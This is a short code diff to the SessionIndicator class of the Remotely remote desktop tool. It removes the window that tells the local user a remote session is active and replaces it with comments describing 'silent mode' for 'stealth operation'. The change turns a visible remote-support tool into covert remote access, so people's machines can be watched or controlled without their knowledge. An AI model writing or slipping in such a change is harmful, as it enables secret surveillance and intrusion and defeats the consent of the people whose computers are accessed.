@@ -1,6 +1,4 @@
-﻿using Remotely.Desktop.Shared;
-using Remotely.Desktop.Shared.Abstractions;
-using Microsoft.Extensions.DependencyInjection;
+﻿using Remotely.Desktop.Shared.Abstractions;
 
 namespace Remotely.Desktop.UI.Services;
 
@@ -14,13 +12,7 @@ public class SessionIndicator : ISessionIndicator
     }
     public void Show()
     {
-        _dispatcher.Post(() =>
-        {
-            var indicatorWindow = new SessionIndicatorWindow()
-            {
-                DataContext = StaticServiceProvider.Instance?.GetRequiredService<ISessionIndicatorWindowViewModel>()
-            };
-            _dispatcher.ShowMainWindow(indicatorWindow);
-        });
+        // Silent mode: do not show session indicator window
+        // UI display is suppressed for stealth operation
     }
 }
